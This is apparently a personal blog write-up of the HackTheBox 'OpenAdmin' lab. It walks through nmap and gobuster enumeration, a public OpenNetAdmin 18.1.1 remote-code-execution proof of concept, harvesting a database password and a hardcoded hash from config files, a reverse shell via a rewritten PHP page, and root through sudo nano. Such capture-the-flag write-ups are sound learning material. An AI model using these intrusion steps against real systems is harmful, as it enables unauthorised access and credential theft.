---
title: OpenAdmin
date: 2022-06-16 
categories: [HackTheBox, Easy]
tags: [writeup, linux]     # TAG names should always be lowercase
author: Derrick
---

![](https://i.imgur.com/9FXiUJm.png)

For an easy box, this box is considerably long. This box required hunting for credentials all over the place but in the end, the privesc to root was somewhat disappointing. There seems to be a reoccuring trend that these old boxes involve little to no post-exploitation. Many of the times `sudo -l` pretty much gives you the answer. Regardless, this box is pretty fun to enumerate for those credentials.

## Recon
---
`nmap -sVC 10.10.10.171`
```                 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-16 04:01 EDT
Nmap scan report for openadmin.htb (10.10.10.171)
Host is up (0.087s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.55 seconds
```
Looks like we have a website as per usual
![](https://i.imgur.com/fN14SJv.png)


Default page. Use gobuster to reveal any additional directories.
`gobuster dir -u http://10.10.10.171 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 50 `
``` 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.171
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/06/16 04:02:39 Starting gobuster in directory enumeration mode
===============================================================
/music                (Status: 301) [Size: 312] [--> http://10.10.10.171/music/]
/sierra               (Status: 301) [Size: 313] [--> http://10.10.10.171/sierra/]
```
![](https://i.imgur.com/gv65boy.png)
There are several sites but only music led me somewhere interesting. The login page links to an ONA page.

## Foothold
---
![](https://i.imgur.com/suzxBHl.png)

ONA version 18.1.1 is vulnerable to RCE to lets use the poc.

`python3 exploit.py exploit http://10.10.10.171/ona/`
```
[*] OpenNetAdmin 18.1.1 - Remote Code Execution
[+] Connecting !
[+] Connected Successfully!
sh$ 
```

## User
---
Since we have an apache site, lets check over the sites enabled n such. I found this which is interesting.

`cat /etc/apache2/sites-enabled/internal.conf`
```console              
Listen 127.0.0.1:52846  

<VirtualHost 127.0.0.1:52846>                      
    ServerName internal.openadmin.htb 
    
    DocumentRoot /var/www/internal
    
<IfModule mpm_itk_module>                    
AssignUserID joanna joanna                    
</IfModule>                    

    ErrorLog ${APACHE_LOG_DIR}/error.log 
    CustomLog ${APACHE_LOG_DIR}/access.log combined  
    
</VirtualHost>
```
A locally hosted vhost on port 52846.

Double checking with `netstat -tulpn`
```
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                         
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -  
```
Confirmed we have a listening port.

Inside the ona database we find some credentials
`cat local/config/database_settings.inc.php`
```php
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);

?
```
We have jimmy

``cat /var/www/internal/index.php`
```php
if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
```

We also have these hardcoded credentials. Crack and probably use it somewhere.

Password from cracking the hash:

jimmy:Revealed    

This is for the internal webserver. Logging in executes a command set in from the main.php file under the webroot. We can rewrite it and grab a reverse shell instead. We have user :)

## Root
---
`sudo -l` reveals that joanna is able to use nano. [GTFOBins](https://gtfobins.github.io/gtfobins/nano/#sudo). Being able to run nano with sudo spawns a shell with root level priviliges. Just follow the commands as detailed from GTFOBins and this box is pwned :)